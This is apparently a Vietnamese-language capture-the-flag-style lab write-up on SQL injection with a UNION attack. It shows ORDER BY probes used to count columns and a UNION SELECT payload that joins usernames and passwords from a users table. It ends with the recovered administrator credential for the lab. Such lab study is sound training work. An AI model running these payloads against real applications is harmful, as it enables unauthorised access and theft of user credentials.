# SQL injection UNION attack, retrieving multiple values in a single column

Bài lab này yêu cầu ta đăng nhập vào hệ thống với quyền quản trị viên bằng cách truy xuất nhiều thông tin dữ liệu bên trong 1 cột của bảng trong database.

Đầu tiên ta kiểm tra xem có bao nhiêu cột trong bảng của database, lần lượt dùng các pay load sau để kiểm tra:
- `filter?category=' ORDER BY 1--`
- `filter?category=' ORDER BY 2--`
- `filter?category=' ORDER BY 3--`( Tới đây thì sever error, vậy là chỉ có 2 cột trong bảng).

Tiếp theo ta sẽ truy cập vào dữ liệu(`username` và `password`) của 1 cột với payload sau:

`filter?category=' UNION SELECT NULL, username || '~' || password FROM users--`(vì có 2 cột mà ta chỉ tìm nhiều dữ liệu trong 1 cột nên phải thêm `NULL` vào để tượng trưng cho 1 cột, ở cột còn lại ta dùng kí tự `~` để ngăn cách dữ liệu `username` và `password`)

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134396951861936178/image.png)

`administrator~gyxzc559wjibvohaoiwk` (Giờ thì đăng nhập vào và hoàn thành bài lab thôi)

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134399009130299474/image.png)